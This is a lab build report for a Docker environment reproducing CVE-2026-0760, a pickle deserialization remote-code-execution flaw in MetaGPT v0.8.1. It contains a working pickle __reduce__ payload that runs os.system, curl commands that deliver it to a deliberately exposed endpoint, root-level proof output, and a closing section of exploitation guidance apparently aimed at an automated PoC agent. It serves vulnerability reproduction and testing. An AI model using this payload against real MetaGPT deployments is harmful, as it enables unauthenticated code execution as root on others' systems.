# Lab Build Report: CVE-2026-0760

## Lab Architecture

| Component | Description |
|---|---|
| **CVE** | CVE-2026-0760 — MetaGPT `deserialize_message()` Deserialization of Untrusted Data → RCE |
| **Architecture** | Single container (no external services required) |
| **Attack Surface** | HTTP endpoint exposing `deserialize_message()` + direct `docker exec` access |

The lab consists of a single Docker container running MetaGPT v0.8.1 with a Flask-based HTTP server that exposes the vulnerable `deserialize_message()` function over the network. The vulnerability is a straightforward Python `pickle.loads()` call on untrusted data (CWE-502).

No database, Redis, or other supporting services are needed — the vulnerability is in MetaGPT's serialization utility and can be triggered by a direct function call with a crafted pickle payload.

---

## Container Details

### cve-2026-0760-vulnerable

| Field | Value |
|---|---|
| **Container Name** | `cve-2026-0760-vulnerable` |
| **Image** | `cve-2026-0760-vulnerable:latest` (built from Dockerfile.vulnerable) |
| **Base Image** | `python:3.9-slim-bookworm` |
| **Software** | MetaGPT v0.8.1 (commit `c036574507e7616c02512e7c8ad88dd847783afa`) |
| **Service Port** | 8080 (Flask HTTP server) |
| **Networks** | `lab-net` |
| **Health Check** | HTTP GET `/health` every 5s |

**Installed software:**
- Python 3.9 (matching MetaGPT's documented requirement of >=3.9, <3.12)
- MetaGPT v0.8.1 installed in editable mode (`pip install --no-deps -e .`)
- Minimal dependency set (pydantic, loguru, aiofiles, chardet, requests, Pillow, tenacity, python-docx, tiktoken, flask)
- Full `metagpt.utils.serialize` module importable with all required transitive dependencies

**Key paths inside container:**
- `/opt/metagpt/` — MetaGPT source code (v0.8.1)
- `/opt/metagpt/metagpt/utils/serialize.py` — Vulnerable file
- `/opt/verify.py` — Lab verification script
- `/opt/vuln_server.py` — Vulnerable HTTP demo server

---

## Network Configuration

| Network | Purpose |
|---|---|
| `cve-2026-0760_lab-net` | Internal lab network (for multi-container scenarios) |

---

## HTTP API Endpoints

The vulnerable Flask server exposes three endpoints:

| Method | Path | Description |
|---|---|---|
| GET | `/` | Info page (JSON) — lists endpoints and CVE details |
| GET | `/health` | Health check — returns `{"status": "ok", "vulnerable": true}` |
| POST | `/api/message/deserialize` | **VULNERABLE** — accepts base64-encoded pickle data, passes to `deserialize_message()` |

**Sending a payload to the vulnerable endpoint:**
```bash
# JSON body format
curl -X POST "http://${CONTAINER_IP}:8080/api/message/deserialize" \
  -H "Content-Type: application/json" \
  -d '{"data": "<base64-encoded-pickle-bytes>"}'

# Raw body format
curl -X POST "http://${CONTAINER_IP}:8080/api/message/deserialize" \
  -d '<base64-encoded-pickle-bytes>'
```

The endpoint returns HTTP 500 after RCE payload execution (because `os.system()` returns an int, not a Message object) — but **code execution occurs during `pickle.loads()` before the error**.

---

## Build Status

| Component | Status | Notes |
|---|---|---|
| `Dockerfile.vulnerable` | ✅ **SUCCESS** | Built cleanly with all dependencies |
| `docker-compose.yml` | ✅ **SUCCESS** | Container starts and passes health checks |
| MetaGPT install | ✅ **SUCCESS** | v0.8.1 installed with minimal deps, `deserialize_message()` importable |
| Flask server | ✅ **SUCCESS** | Listening on 0.0.0.0:8080 |
| Vulnerability verified | ✅ **SUCCESS** | RCE confirmed via both direct function call and HTTP endpoint |

**No workarounds needed.** The build was straightforward with the minimal dependency approach.

---

## Start/Stop Commands

```bash
# Start lab
docker compose up -d

# Check status
docker compose ps

# View logs
docker compose logs

# Stop lab
docker compose down

# Full reset (remove volumes and images)
docker compose down -v --rmi local
```

---

## Verification Evidence

### 1. Container Running and Healthy
```
NAME                       IMAGE                      STATUS                   PORTS
cve-2026-0760-vulnerable   cve-2026-0760-vulnerable   Up (healthy)             0.0.0.0:8080->8080/tcp
```

### 2. MetaGPT v0.8.1 Installed (Git Tag Confirmed)
```
MetaGPT version: 0.8.1
Git commit: c0365745 update version
Git tag: v0.8.1
```

### 3. Vulnerable Function Accessible
```
[+] deserialize_message() imported successfully
[+] CONFIRMED: deserialize_message() uses pickle.loads()
```

### 4. RCE Confirmed — Direct Function Call
```python
docker exec cve-2026-0760-vulnerable python3 -c "
import pickle, os
from metagpt.utils.serialize import deserialize_message

class RCEPayload:
    def __reduce__(self):
        return (os.system, ('id > /tmp/cve-2026-0760-proof.txt',))

try: deserialize_message(pickle.dumps(RCEPayload()))
except: pass
"
```
**Result:** `/tmp/cve-2026-0760-proof.txt` contains `uid=0(root) gid=0(root) groups=0(root)`

### 5. RCE Confirmed — HTTP Endpoint
```bash
PAYLOAD=$(python3 -c "import pickle,os,base64; exec(\"class R:\\n def __reduce__(self): return (os.system, ('id > /tmp/proof.txt',))\"); print(base64.b64encode(pickle.dumps(R())).decode())")
curl -X POST "http://${CONTAINER_IP}:8080/api/message/deserialize" \
  -H "Content-Type: application/json" -d "{\"data\": \"$PAYLOAD\"}"
```
**Result:** HTTP 500 returned (expected), but `id > /tmp/proof.txt` executed successfully — proving RCE occurred during `pickle.loads()`.

---

## Lab Files

| File | Path | Description |
|---|---|---|
| Dockerfile | `Dockerfile.vulnerable` | Builds MetaGPT v0.8.1 container with Flask server |
| Compose | `docker-compose.yml` | Container orchestration |
| Requirements | `requirements-minimal.txt` | Minimal pip dependencies for serialize.py import chain |
| Verify Script | `verify.py` | Verifies vulnerable function is importable and uses pickle.loads |
| Vuln Server | `vuln_server.py` | Flask HTTP server exposing deserialize_message() |

---

## PoC Agent Guidance

### Two attack vectors available:

**Vector 1 — Direct Function Call (simplest, recommended):**
```bash
docker exec cve-2026-0760-vulnerable python3 /path/to/poc.py
```
- Import `from metagpt.utils.serialize import deserialize_message`
- Call with `pickle.dumps()` of a class with malicious `__reduce__`
- Verify with file creation, command output, or callback

**Vector 2 — HTTP Endpoint (network-accessible):**
```bash
curl -X POST "http://localhost:8080/api/message/deserialize" \
  -H "Content-Type: application/json" \
  -d '{"data": "<base64-pickle-payload>"}'
```
- Payload: base64-encoded pickle bytes
- RCE executes during `pickle.loads()`, before any application validation
- HTTP 500 response is expected (the deserialized object isn't a Message) but code already ran

### Key notes for PoC:
1. **No authentication needed** — both vectors are pre-auth
2. **Payload executes during `pickle.loads()`** — the subsequent AttributeError is irrelevant
3. **Use `os.system()` in `__reduce__`** for simplest RCE, or `subprocess.check_output()` for output capture
4. **The `message_ser` parameter accepts bytes** despite the `str` type hint
5. **No LLM API keys or config needed** — the vulnerability is in the serialization utility
6. **Container runs as root** — full system access upon exploitation

---

## Known Issues

None. The lab builds and runs cleanly without workarounds.
